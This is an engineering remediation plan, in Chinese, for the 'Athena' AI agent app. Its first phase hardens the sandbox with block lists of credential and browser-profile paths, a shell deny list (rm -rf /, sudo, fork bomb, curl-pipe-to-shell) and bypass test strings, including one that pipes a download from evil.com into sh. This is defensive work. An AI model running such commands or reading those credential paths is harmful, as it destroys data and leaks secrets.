# Athena 修复计划（基于 2026-05-25 审计）

> 配套文档：[audit-2026-05-25.md](./audit-2026-05-25.md)
> 基线 commit：`d305577`
> 编写日期：2026-05-25
> 目标：把审计中 9 高危 / 8 中危 / 4 低危问题分阶段消化

## 修复优先级矩阵

| 阶段 | 紧迫度 | 主题 | 包含问题 |
|---|---|---|---|
| Phase 1 | 本周 | Agent 子系统安全加固 | A1, A2, A3, A4, C2 |
| Phase 2 | 本月 | DI 与架构治理 | A5, A6, A7, A8, B7, B8, C1, C3, C4 |
| Phase 3 | 本月 | 数据库可靠性 | A9, B1, B2, B3, B4, B5, B6 |

每个阶段都要：
1. 在主干起独立分支（如 `fix/agent-security`、`fix/di-arch`、`fix/db-reliability`）
2. 阶段结束合并前自测覆盖核心路径
3. 完成后回到本文件把对应问题标记为 ✅ 并补充修复 commit

---

## Phase 1：Agent 子系统安全加固

**目标**：堵住"提示注入即可外泄私钥"的安全漏洞，按**通用 Agent 定位**重新设计沙箱模型。

### 设计前提：Athena 是通用 Agent，不是编码 Agent

通用 Agent 的工作区是**整台电脑**，不是某个项目目录。沙箱不能以"项目根白名单"为前提，否则要么过严（用户整理 ~/Downloads 时寸步难行）要么过松（被迫放开导致敏感目录失守）。

**两层路径模型**：

| 层 | 范围 | 处理 |
|---|---|---|
| **L0 硬黑名单** | 凭据目录（`~/.ssh`、`~/.aws`、`~/.gnupg`、`~/.config/op` 等）、浏览器 profile（Cookies / LoginData）、系统目录（`/etc`、`/System`、`/private/var/db`）、Athena 自身配置（`~/.athena/`、SQLite 数据库）；shell 高危模式（`rm -rf /`、`curl \| sh`、fork bomb、`sudo`） | 直接拒绝，无审批选项 |
| **L1 全盘其他路径** | 黑名单外的所有路径 | 默认审批；审批选项：本次 / 本会话 / 永久 |

**关键约束**：

- **shell 命令本身强制审批**，不允许按命令前缀（`rm`、`bash`、`cat`）授权。可以允许"Always allow 完整命令字面量"（如 `git status`），但不允许按命令族放开
- **shell/powershell 默认 cwd = 用户 home 目录**（不是项目根）。LLM 显式传入的 workdir 走和文件读写相同的 L0/L1 判定
- **永久规则默认粒度 = 仅该目录非递归**，"该目录递归"是单独勾选项，需用户主动确认。避免一次点击产生"永久允许 ~"这种灾难规则
- **所有路径校验前先 canonicalize + 解析 symlink**，避免 `..` / 符号链接绕过

### Step 1.1：重写 PathSandbox（修复 A1）

**改动点**：
1. `lib/agent/permission/sandbox.dart` 重写：
   - `_resolve` 处理 `..`、`~`、相对路径 → 调用 `path.canonicalize` + `File(path).resolveSymbolicLinksSync()`（解析失败时按未解析路径处理但记日志）
   - 删除"项目根白名单"语义，仅保留 L0 硬黑名单
   - L0 黑名单按平台扩展：
     - macOS：`~/.ssh`、`~/.aws`、`~/.gnupg`、`~/.config/op`、`~/Library/Application Support/Google/Chrome`、`~/Library/Application Support/Firefox`、`~/Library/Cookies`、`~/Library/Keychains`、`/etc`、`/System`、`/private/var/db`
     - Linux：`~/.ssh`、`~/.aws`、`~/.gnupg`、`~/.config/op`、`~/.mozilla`、`~/.config/google-chrome`、`/etc`、`/proc`、`/sys`
     - Windows：`%APPDATA%\Microsoft\Credentials`、`%LOCALAPPDATA%\Google\Chrome\User Data`、`%LOCALAPPDATA%\Microsoft\Edge`、`C:\Windows\System32\config`
     - 通用：Athena 自身配置 `~/.athena/`、SQLite 库文件
   - API：`canRead(path)`、`canWrite(path)`、`canExecute(command)` 仅返回 L0 判定（true/false），具体审批走 PermissionService
2. `lib/di.dart` 注册 `PathSandbox` 为 LazySingleton
3. 所有文件类工具改为构造器注入 `PathSandbox`，入口校验：
   - `file_read_tool.dart`：先 `sandbox.canRead(path)`，被 L0 拒绝直接返回 deniedMsg；否则走 PermissionService 审批
   - `file_write_tool.dart` / `file_delete_tool.dart`：同上但用 `canWrite`
   - `bash_shell_tool.dart` / `powershell_shell_tool.dart`：`sandbox.canExecute(command)` + `sandbox.canWrite(workdir)`，任一失败拒绝；workdir 未指定时默认 home
4. 单元测试覆盖：
   - 各平台黑名单路径被拒
   - `~/.ssh/../.ssh/id_rsa`、`/private/var/db/../../../etc/passwd` 等绕过尝试
   - 指向 `~/.ssh` 的 symlink 被拒
   - 路径 canonicalize 失败时的降级行为

**验收**：
- `file_read('~/.ssh/id_rsa')` 被沙箱直接拒绝，不弹审批
- `file_read('~/Documents/notes.md')` 弹审批
- 在审批 UI 勾选"永久 / 仅该目录"后，`file_read('~/Documents/other.md')` 仍弹审批；勾选"永久 / 该目录递归"后才放行

### Step 1.2：file_read 升级为 needsApproval + 接入 PermissionService（修复 A2）

**改动点**：
1. `lib/agent/tool/file_read_tool.dart`：`DangerLevel.safe` → `DangerLevel.needsApproval`
2. `lib/agent/permission/permission_service.dart` 与 `permission_rule.dart`：
   - 规则结构 `{operation: read|write|execute, path: String, recursive: bool, scope: once|session|permanent}`
   - 审批查询：先匹配永久规则（按目录前缀 + recursive 标记），命中即过；否则弹审批
   - 审批 UI 三选项 × 三粒度（仅此文件 / 该目录 / 该目录递归），默认"该目录非递归"
3. `lib/agent/permission/permission_dialog.dart`：UI 文案展示**绝对路径**、操作类型、风险提示

**验收**：
- 读 `~/Downloads/a.txt` 弹审批，勾"永久 / 该目录"后读 `~/Downloads/b.txt` 不再弹；读 `~/Downloads/sub/c.txt` 仍弹
- 勾"永久 / 该目录递归"后读 `~/Downloads/sub/c.txt` 不再弹
- 关闭 chat 重开，"本会话允许"规则失效，"永久允许"仍生效
- `~/.ssh/id_rsa` 始终被 L0 拒，永远不到审批层

### Step 1.3：Shell 工具收紧（修复 A3）

**改动点**：
1. `lib/agent/tool/bash_shell_tool.dart` 与 `powershell_shell_tool.dart`：
   - 入口先 `sandbox.canExecute(command)`（L0 检查）+ `sandbox.canWrite(workdir)`（L0 检查）
   - workdir 默认值改为用户 home 目录（不是 `Directory.current`）
   - 删除 `_extractCommandPrefix`——shell 不再支持"按前缀 Always allow"
   - 审批粒度只允许：本次 / 本会话 / 永久（完整命令字面量匹配）
2. `lib/agent/permission/sandbox.dart` 的 shell 黑名单（L0 硬拒）：
   - token 级解析后比对：`rm` + 路径参数中包含 `/` 起始 + `-r`/`-rf` 标志
   - `sudo` / `doas` 任意形式
   - fork bomb 模式 `:(){:|:&};:` 及变体（关键 token 检测）
   - `curl ... | sh` / `wget ... | bash` 管道执行
   - 重定向写入黑名单目录（如 `> ~/.ssh/authorized_keys`）
3. shell 审批 UI 展示完整命令 + cwd + 风险等级（低/中/高），高风险命令不允许"永久允许"选项

**验收**：
- `rm -rf /` / `rm  -rf  /`（双空格） / `r''m -rf /` 均被 L0 拒
- `workdir: "/Users/cals/.ssh"` 被 L0 拒
- `cat $(curl http://evil.com/x | sh)` 被 L0 拒（pipe-to-shell 模式）
- `git status` 首次弹审批，"永久允许"后再次调用 `git status` 不弹；但 `git log` 仍弹（完整命令字面量不同）
- 没有 workdir 时，cwd 是用户 home 目录（不是项目根）

### Step 1.4：Skill `allowed-tools` 真正消费（修复 A4）

**改动点**：
1. `lib/agent/skill/skill_loader.dart`：YAML name 校验（不含路径分隔符与控制字符）
2. `lib/agent/skill/skill_registry.dart`：增加 `currentSkillContext` 栈（Agent 调用 `Skill("x")` 时 push，本轮工具调用全部在 x 上下文中）
3. `lib/agent/agent_service.dart` 在分发工具前：
   - 若当前处于某 Skill 上下文 且 工具不在该 Skill 的 `allowedTools` 列表中 → 强制走 `needsApproval`
   - 若 `allowedTools` 中包含该工具 → 可降级为 safe（前提是工具默认 ≤ needsApproval）
4. 文档与实现一致性：
   - CLAUDE.md 与 `permission_rule.dart:73` 统一为 `permissions.json`（实现已用 json，文档需更新）
   - Skill 项目级 vs 用户级冲突解决策略明确（建议项目级优先）

**验收**：
- 测试 Skill 声明 `allowed-tools: file_read`，调用 `bash` 工具时被强制弹审批
- 同名 Skill 项目级覆盖用户级，并在加载时打日志

### Step 1.5：PowerShell 搜索工具修正（修复 C2）

**改动点**：
1. `lib/agent/tool/powershell_search_tool.dart`：
   - `extensions` 改为 PowerShell 原生数组语法 `@('*.dart','*.yaml')`，循环调用 `Get-ChildItem -Include`
   - pattern 用 `Select-String -Pattern $pattern -SimpleMatch:$false` 真正支持 regex
   - 转义改为 `[Management.Automation.WildcardPattern]::Escape` 或参数 binding

**验收**：在 Windows 上测试 `pattern='TODO'`、`extensions='.dart'` 能搜出真实结果。

---

## Phase 2：DI 与架构治理

**目标**：让 DI 真正承担依赖管理职责，把 ChatViewModel 拆分推进到位，修复反向依赖。

### Step 2.1：补齐 DI 注册（修复 A5 - 注册部分）

**改动点** `lib/di.dart`：
1. 注册所有 Repository（当前缺：`MemoryRepository`、`TRPGGameRepository`、`TRPGMessageRepository`）
2. 注册所有 Service（当前缺：`ChatManageService`、`ChatSupportService`、`MessageSendService`、`MemoryService`、`SentinelService`、`SummaryService`、`TranslationService`、`TRPGService`）
3. 注册 `PathSandbox`（Phase 1 已要求）

**验收**：`GetIt.instance.allRegistrations` 包含所有 lib/repository/、lib/service/、lib/agent/ 下的导出类。

### Step 2.2：消除直接 new，全面走 GetIt（修复 A5 - 调用方部分）

**改动点**：
1. 所有 ViewModel 构造器：去掉 `?? XxxRepository()` 默认值，要么必传，要么内部走 `GetIt.instance<XxxRepository>()`
2. 所有 Service 构造器同上
3. `lib/view_model/chat_view_model.dart:44-48` 改为 `GetIt.instance<ChatManageService>()` 等
4. 增加 lint 规则（自定义 analyzer 插件或简单脚本）扫描 lib/view_model/ 与 lib/service/ 下出现的 `new XxxRepository`/`new XxxService` 字面量，CI 拒绝

**验收**：
- `grep -rn "= XxxRepository()" lib/view_model lib/service` 无结果
- 单元测试可通过 `GetIt.instance.registerSingleton<ChatRepository>(MockChatRepository())` 注入 mock

### Step 2.3：修复 MessageSendService 反向依赖（修复 A6 + C3）

**改动点**：
1. 删除 `lib/service/message_send_service.dart` 中对 `AgentService`/`PermissionService` 的 import 与字段
2. 选择以下方案之一（推荐方案 B）：
   - **方案 A**：把 `MessageSendService` 上移到 `lib/agent/`，更名为 `MessageOrchestrationService`，与 `AgentService` 同层
   - **方案 B**：把 `MessageSendService` 删除，ChatViewModel 直接订阅 `AgentService.run(...)`，事件转换逻辑搬回 VM 内（反正只有 VM 用）
3. 顺带删除 `SendIterationEnd` 死代码（修复 C3）

**验收**：`lib/service/` 下不再 import `lib/agent/`。

### Step 2.4：ChatViewModel sendMessage 真正瘦身（修复 A7）

**改动点**（前置：A6 已确定方案）：
1. 把 `chat_view_model.dart:497-706` 的 sendMessage 切成 3 层：
   - **业务编排**（Agent 流 → 多轮消息组装）下沉到 `AgentService` 内部或新 `MessageOrchestrationService`
   - **持久化**（占位消息落库、storeMessage、updateMessage、updateChatTimestamp、错误回滚）下沉到 `ChatManageService` 新增方法
   - **UI 状态更新**（Signal、buffers）留在 VM
2. 删除 `lib/service/chat_message_service.dart:49-63` 死方法 `getCompletionStream`（修复 C4）

**验收**：
- `sendMessage` 主体 < 50 行
- VM 内不再出现 `_messageRepository.updateMessage` / `jsonEncode(buffers)` 等持久化细节
- 重构后单元测试覆盖：单轮、多轮 tool call、中途权限拒绝、流式中途取消

### Step 2.5：流式取消机制改造（修复 A8）

**改动点**：
1. `AgentService.run(...)` 接受 `cancelToken` 参数（自定义类，含 `isCancelled` flag 与 `cancel()` 方法）
2. 在 await for 关键节点检查 cancelToken：
   - HTTP 请求前
   - 工具调用前
   - 权限弹窗前/后
3. ChatViewModel 维护 `CancelToken? _activeCancelToken`，"停止生成"按钮调用 `_activeCancelToken?.cancel()` 而非仅设 `isStreaming.value = false`
4. cancel 后明确清理状态（删除占位消息 or 保留 partial），文档化行为

**验收**：
- 在权限弹窗未关闭时点"停止生成"，弹窗自动关闭、Agent 退出、UI 状态干净
- 在 HTTP 长时间挂起时点"停止生成"，3 秒内回到非流式状态

### Step 2.6：分层修正（修复 B7）

**改动点**：
1. `lib/agent/permission/permission_dialog.dart` → 迁移到 `lib/widget/permission_dialog.dart` 或 `lib/component/permission_dialog.dart`
2. `lib/service/chat_support_service.dart:exportImage` → 上移到 `lib/view_model/chat_view_model.dart` 或新建 `lib/widget/chat_export.dart`
3. 验证 `lib/service/` 不再 import `flutter/material.dart`

**验收**：`grep -l "flutter/material" lib/service/` 无结果。

### Step 2.7：Service 边界重划（修复 B8）

**改动点**：
1. `ChatManageService` 重新定义为 "Chat 元数据生命周期"：create / select / delete / pin / toggleHidden / 时间戳维护
2. `ChatSupportService` 重新定义为 "Chat 设置面板支持"：updateModel / updateSentinel / updateContext / updateTemperature / renameChatManually（统一在内部调用 updated_at 更新）
3. 删除 `ChatManageService` 中的单行透传方法（`getModel/getSentinel/storeMessage/updateMessage/refreshMessages`），让 VM 直接用 Repository（前提：A5 已落地）
4. 把 `updated_at` 更新逻辑统一封装在 `_touchChat(int id)` 私有方法，由 `ChatSupportService` 所有 update* 方法调用（顺带修复 B5）

**验收**：用户改模型后，chat 列表按 updatedAt 排序时立即冒泡。

### Step 2.8：UI 直接调 Agent 服务修正（修复 C1）

**改动点**：
1. 把 `home_page.dart:366`、`home.dart:110` 的 `GetIt.instance<PermissionService>().load()` 移到 `main.dart` 的初始化阶段
2. 或把它包到某个 ViewModel 的 init 方法中，让页面通过 ViewModel 触发

**验收**：lib/page/ 下不再直接 `GetIt.instance<PermissionService>()`。

---

## Phase 3：数据库可靠性

**目标**：把数据库从"裸跑"提升到"原子 + 防御性"，避免预设重复插入与外键失效。

### Step 3.1：迁移与 reset 增加事务（修复 A9）

**改动点**：
1. `lib/database/database.dart:_migrate()`：
   - 整个 `_migrate` 包在 `db.transaction((tx) async { ... })` 中（Laconic API 视实际而定）
   - 或每个迁移单独事务，迁移成功后才 INSERT migrations 表
2. `lib/database/database.dart:reset()`：DROP 全部表 + 重建 + 预设一次性事务
3. 每个 `migration_*.dart` 文件内部多个 statement 也用事务包裹

**验收**：人为在某迁移中插入 `throw Exception('boom')`，重启后数据库应回到迁移前状态而非半成品。

### Step 3.2：预设逻辑改幂等（修复 B1）

**改动点**：
1. `lib/database/database.dart:_presetProviders`：
   - 把"是否预设过"标记落地到 migrations 表或单独的 `app_meta` 表（key=`preset.providers.v1`）
   - 不再用 `providerCount > 0` 判定
2. `_presetSentinel` 同上
3. `migration_202501170001_init.dart` 给 models 表加 `FOREIGN KEY (provider_id) REFERENCES providers(id) ON DELETE CASCADE`（通过新迁移做）

**验收**：用户在 UI 删除所有 provider，重启不会重新插入预设。

### Step 3.3：启用 PRAGMA foreign_keys（修复 B3）

**改动点**：
1. `lib/database/database.dart` 数据库打开后立即执行 `PRAGMA foreign_keys = ON`
2. 验证 SQLite 版本支持（laconic_sqlite 应都支持）
3. 启用后跑一次现有数据自检：找出已有的孤儿数据（messages.chat_id 不存在等），写脚本清理或转入迁移

**验收**：删除 chat 后 `SELECT COUNT(*) FROM messages WHERE chat_id NOT IN (SELECT id FROM chats)` 为 0。

### Step 3.4：chat_repository SQL 改占位符（修复 B2）

**改动点**：
1. `lib/repository/chat_repository.dart:67-77` `getChatsAfterId` 改为 laconic builder 或参数化 `select(sql, [chatId, limit])`
2. 全仓库 grep 是否还有类似裸 SQL，统一改造

**验收**：`grep -rn 'WHERE .* \$' lib/repository/` 无结果。

### Step 3.5：context_window 数据修复（修复 B4）

**改动点**：
1. 新增迁移 `migration_2026MMDD0001_normalize_context_window.dart`：
   - 把所有纯数字字符串（`'128000'`）标准化为 `'128,000 context'` 或反过来统一为纯数字
   - 选择"纯数字"路径更简单：所有 `'128,000 context'` 提取数字并改为 `128000`
2. 后续 UI/排序都按数字处理

**验收**：`SELECT DISTINCT context_window FROM models` 中不再出现混合格式。

### Step 3.6：错误回滚保留 toolCalls 现场（修复 B6）

**改动点**：
1. `lib/view_model/chat_view_model.dart:691-702` catch 分支：
   - 不再 `MessageEntity(... content: 'Error: ...')` 整体覆盖
   - 改为 `currentMessage.copyWith(content: '${currentMessage.content}\n\n[Error: ${e}]')`
   - `toolCalls` / `toolResults` / `reasoningContent` 保留
2. 若同时希望让用户重试，在 MessageEntity 增加 `errorMessage` 字段（新迁移），UI 显示错误条但内容不丢

**验收**：模拟 tool 调用 3 轮后第 4 轮 HTTP 失败，重启 chat 后能看到前 3 轮工具调用历史与第 4 轮错误标记。

---

## 跨阶段：低优先级清理

可与上述阶段穿插完成，不阻塞主线。

- **C3**：`SendIterationEnd` 死代码 → 已在 Step 2.3 中删除
- **C4**：`ChatMessageService.getCompletionStream` 死方法 → 已在 Step 2.4 中删除
- **B8 残留**：`ChatViewModel:81-85` 5 个透传 getter（向后兼容）→ Phase 2 结束后可删

---

## 不做的事

以下条目经审查后不在本次修复范围：

- **CLAUDE.md 合规性问题**：审计未发现违反项，无需改动
- **Skill YAML billion-laughs 防御**：`yaml` 包目前实现已对 anchor 数量有限制，且攻击面小（需要用户主动放入恶意 SKILL.md），优先级低于上面所有项
- **PermissionStore Windows `USERPROFILE` 兼容**：Windows 用户量小，留到下次平台测试时一并处理
- **PathSandbox `..` 处理**：纳入 Step 1.1 同步修复，不单独列条目

---

## 跟踪与回填

- 每修完一个问题，回到 `audit-2026-05-25.md` 把对应条目"状态"改为 ✅ 并附上 commit hash
- 阶段结束时在本文件对应 Step 末尾追加"完成日期 + commit hash + 实际偏差"
- 每个阶段开 PR 前跑一遍 `flutter analyze` + 关键路径单元测试
